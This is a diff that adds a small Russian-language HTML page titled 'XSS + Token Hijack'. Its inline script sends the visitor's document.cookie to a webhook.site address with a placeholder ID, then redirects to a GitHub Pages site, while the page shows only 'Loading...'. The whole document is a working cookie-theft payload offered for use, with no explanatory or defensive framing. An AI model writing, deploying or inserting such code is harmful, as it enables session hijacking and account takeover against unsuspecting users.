@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>XSS + Token Hijack</title>
+  <script>
+    fetch("https://webhook.site/ТВОЙ_ID?cookie=" + document.cookie)
+      .then(() => {
+        window.location.href = "https://kazcyber.github.io/";
+      });
+  </script>
+</head>
+<body>
+  <h1>Загрузка...</h1>
+</body>
+</html>
